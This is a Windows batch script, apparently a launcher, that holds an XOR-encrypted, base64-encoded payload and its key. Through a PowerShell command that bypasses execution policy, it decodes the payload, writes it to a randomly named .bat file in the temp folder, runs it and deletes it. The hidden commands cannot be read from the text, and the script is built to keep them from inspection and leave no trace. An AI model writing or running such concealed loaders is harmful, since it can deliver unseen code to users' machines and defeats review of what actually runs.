@echo off
chcp 65001 >nul
setlocal
set "CQ_DIR=%~dp0"
set "CQ_KEY=CyanQiuper2026!x9"
set "CQ_B64=AxwCBj5JGhYDfzhTWlVRWA92SVFfcVcbBQl/OERbQk0dGQAAAAAAAAAAAAASc35/LHJaJ1lOCnFLUDM0LXZ5YBMDdTM0EQQcNEkbHwEXEg5cQ01YC30XFAJcYxwWRRdAQl1ETR1PJhVBX3FBeHpFUldTWlkBI3wRKy48DEk7HwEXHFpBFk8XTWMfDhs/DVtQNR5XUUFTARFXMA0AAj1JOx8BFxxaQRYTSBksC0EANB4QAkt/OBASRkANSiZ0a05xDA0ZEVIdUhIHLHIQTnMPATUMVRMJGxxdWEUsclwgEQ5AXGMQEw0dEmtxT0AWaCoMEQsjSTY8LFJXSFtCRBxkYwkTCyIaVRELCxJbV08BDFZjGg0BIgxbXkt/OEBTQ1IdGX0XFAJcYw=="
powershell -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::FromBase64String($env:CQ_B64);$k=[Text.Encoding]::UTF8.GetBytes($env:CQ_KEY);for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]};$p=Join-Path $env:TEMP ('cq-launch-'+[guid]::NewGuid().ToString('N')+'.bat');[IO.File]::WriteAllBytes($p,$b);& cmd /c $p;Remove-Item $p -Force -ErrorAction SilentlyContinue"
endlocal
